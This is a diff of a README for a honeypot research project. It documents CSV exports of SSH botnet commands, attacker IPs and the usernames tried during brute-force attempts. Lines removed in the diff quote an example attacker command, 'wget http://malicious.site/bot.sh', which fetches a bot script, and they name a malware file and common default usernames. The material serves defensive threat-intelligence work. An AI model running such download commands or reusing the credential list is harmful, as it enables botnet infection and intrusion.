@@ -17,6 +17,8 @@ The primary objective of this research was to quantify the "background radiation
 2.  **Analyze TTPs:** Catalog the Tactics, Techniques, and Procedures used by modern botnets.
 3.  **Identify Campaigns:** Fingerprint specific botnet families (RedTail, Mdrfckr, BillGates).
 
+![Commands Overtime](images/Screenshot%20of%20Overview.png)
+
 ---
 
 ## 📊 Key Statistics (15-Day Capture)
@@ -55,53 +57,31 @@ Attackers aggressively competed for CPU cycles. I observed multiple scripts spec
 
 ---
 
-## 📂 Dataset Documentation
+## 📂 File Structure & Descriptions
 
-This repository contains 6 CSV files exported from the ELK (Elasticsearch, Logstash, Kibana) stack. Below is a detailed breakdown of each file's contents and utility.
+### 1. [List of All Commands (All Data).csv](data/List%20of%20All%20Commands%20(All%20Data).csv)
+**Description:** The "Master" dataset containing the raw export from the ELK stack. It includes every recorded event with full metadata.
+* **Key Columns:** `@timestamp`, `eventid`, `input`, `src_ip`, `geoip`, `session`.
 
-### 1. `List of All Commands (All Data).csv`
-**Description:** The "Master" dataset. This contains every single logged event including session metadata, geolocation, and timestamps.
-* **Rows:** ~24,000
-* **Key Columns:**
-    * `@timestamp`: Precise time of the event (ISO 8601).
-    * `eventid`: Type of interaction (e.g., `cowrie.command.input`, `cowrie.session.file_download`).
-    * `input`: The raw command string executed by the attacker.
-    * `src_ip`: Attacker IP address.
-    * `geoip.*`: Full enrichment (ASN, Organization, City, Country, Coordinates).
-    * `session`: Unique ID linking multiple commands to one session.
-* **Use Case:** Full forensic timeline reconstruction and behavioral profiling.
+### 2. [List of Commands.csv](data/List%20of%20Commands.csv)
+**Description:** A cleaner, simplified version focused specifically on interactive shell commands and file transfers. Ideal for NLP or pattern analysis.
+* **Key Columns:** `src_ip`, `session`, `input`, `url`, `filename`, `shasum`.
 
-### 2. `List of Commands.csv`
-**Description:** A curated subset focused specifically on **interactive shell commands** and **file transfers**. It removes system noise to focus on the "Action on Objectives."
-* **Key Columns:**
-    * `input`: The command (e.g., `wget http://malicious.site/bot.sh`).
-    * `url`: Source URL if a download was attempted.
-    * `filename`: Name of files uploaded via SFTP (e.g., `redtail.arm7`).
-    * `shasum`: SHA-256 hash of uploaded malware artifacts.
-* **Use Case:** Ideal for training NLP (Natural Language Processing) models to detect malicious shell commands or generating IOC (Indicator of Compromise) lists.
+### 3. [List of Attacker IP with Enrichment.csv](data/List%20of%20Attacker%20IP%20with%20Enrichment.csv)
+**Description:** A list of unique attacker IPs enriched with external threat intelligence data.
+* **Key Columns:** `ipAddress`, `abuseConfidenceScore`, `isp`, `countryCode`, `totalReports`.
 
-### 3. `List of Attacker IP with Enrichment.csv`
-**Description:** A list of the 771 unique attacker IPs, enriched with external reputation data.
-* **Key Columns:**
-    * `ipAddress`: The malicious IP.
-    * `abuseConfidenceScore`: (0-100) Likelihood of the IP being malicious (sourced from AbuseIPDB/Censys).
-    * `isp` / `usageType`: Distinguishes between **Data Center** (likely compromised servers) vs. **Residential** (likely IoT botnets).
-    * `totalReports`: Number of times this IP has been reported globally.
-* **Use Case:** Threat intelligence feed generation and analyzing the infrastructure source of botnets.
+### 4. [Count of SSH commands.csv](data/Count%20of%20SSH%20commands.csv)
+**Description:** Aggregated data showing the frequency of specific commands over time (grouped by 12-hour windows).
+* **Key Columns:** `input.keyword`, `Count of records`.
 
-### 4. `Count of SSH commands.csv`
-**Description:** A time-series aggregation showing the frequency of specific command strings grouped by 12-hour windows.
-* **Key Columns:** `input.keyword`, `timestamp`, `Count`.
-* **Use Case:** Visualizing campaign spikes (e.g., identifying when the "Mdrfckr" campaign wave started and ended).
+### 5. [Count of activity per IP.csv](data/Count%20of%20activity%20per%20IP.csv)
+**Description:** A high-level summary showing the volume of attacks per unique IP address.
+* **Key Columns:** `src_ip.keyword`, `Count of records`.
 
-### 5. `Count of activity per IP.csv`
-**Description:** A high-level volume summary showing which IPs were the "noisiest."
-* **Use Case:** Identifying "Scanner" bots (high volume, low sophistication) vs. "Targeted" attackers (low volume, specific commands).
-
-### 6. `List of Attempted Usernames.csv`
-**Description:** A log of the credentials used during the brute-force phase *before* access was gained.
-* **Key Columns:** `username`, `timestamp`.
-* **Use Case:** analyzing common default credentials used by botnets (e.g., `root`, `admin`, `ubnt`, `pi`).
+### 6. [List of Attempted Usernames.csv](data/List%20of%20Attempted%20Usernames.csv)
+**Description:** A log of the usernames attackers attempted to use during the brute-force phase.
+* **Key Columns:** `@timestamp`, `username`.
 
 ---
 
